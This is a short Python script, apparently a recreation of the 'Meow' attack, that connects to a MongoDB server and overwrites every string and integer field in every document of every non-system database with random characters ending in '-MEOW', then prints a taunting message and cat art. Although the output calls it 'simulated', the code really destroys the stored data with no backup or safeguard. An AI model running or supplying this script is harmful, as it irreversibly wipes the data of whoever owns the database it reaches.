import random
import string
from pymongo import MongoClient

def random_alphanumeric():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

client = MongoClient('mongodb://localhost:27017/')

databases = client.list_database_names()
for db_name in databases:
    if db_name not in ('admin', 'local', 'config'):
        db = client[db_name]
        collections = db.list_collection_names()
        for collection_name in collections:
            collection = db[collection_name]
            documents = collection.find()
            for doc in documents:
                updated_doc = {}
                for key, value in doc.items():
                    if isinstance(value, str):
                        random_chars = random_alphanumeric()
                        new_value = random_chars + '-MEOW'
                        updated_doc[key] = new_value
                    elif isinstance(value, int):
                        random_chars = random_alphanumeric()
                        new_value = random_chars + '-MEOW'
                        updated_doc[key] = new_value
                    else:
                        updated_doc[key] = value
                collection.update_one({'_id': doc['_id']}, {'$set': updated_doc})

print("Meow Attack simulated. You have been M30W-ed!")
cat_art = r"""
ᓚᘏᗢ
"""
print(cat_art)
